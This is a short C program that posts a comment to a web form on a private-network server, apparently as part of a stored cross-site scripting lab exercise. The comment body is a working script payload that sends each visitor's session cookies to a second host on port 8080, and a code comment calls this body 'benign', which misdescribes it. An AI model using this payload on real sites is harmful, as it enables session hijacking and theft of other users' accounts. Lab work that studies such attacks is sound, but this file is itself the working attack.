#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define BUF_SZ 8192
#define PORT 80
#define SERVER_IP "192.168.1.203"
#define PATH "/task2stored.php"


static int send_all(int fd, const char *buf, size_t len) {
    size_t sent = 0;
    while (sent < len) {
        ssize_t n = send(fd, buf + sent, len - sent, 0);
        if (n <= 0) return 0;
        sent += (size_t)n;
    }
    return 1;
}

int main() {

    // Benign, URL-encoded form body
    const char *body = "comment=<script>fetch(\"http://192.168.1.201:8080\",{method: \"POST\",body:JSON.stringify({cookie:encodeURIComponent(document.cookie)})})</script>";

    char req[BUF_SZ];
    int body_len = (int)strlen(body);

    // Build a minimal HTTP/1.1 request
    int req_len = snprintf(req, sizeof(req),
        "POST %s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "User-Agent: LabClient/1.0\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n"
        "\r\n"
        "%s",
        PATH, SERVER_IP, PORT, body_len, body
    );

    if (req_len <= 0 || req_len >= (int)sizeof(req)) {
        fprintf(stderr, "Request too large or snprintf failed\n");
        return 1;
    }

    // Connect
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) { perror("socket"); return 1; }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((uint16_t)PORT);

    if (inet_pton(AF_INET, SERVER_IP, &addr.sin_addr) != 1) {
        fprintf(stderr, "Invalid IP: %s\n", SERVER_IP);
        close(s);
        return 1;
    }

    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        perror("connect");
        close(s);
        return 1;
    }

    // Send request
    if (!send_all(s, req, (size_t)req_len)) {
        fprintf(stderr, "send failed\n");
        close(s);
        return 1;
    }

    // Read response (print to stdout)
    char buf[BUF_SZ];
    ssize_t n;
    while ((n = recv(s, buf, sizeof(buf) - 1, 0)) > 0) {
        buf[n] = '\0';
        fputs(buf, stdout);
    }

    close(s);
    return 0;
}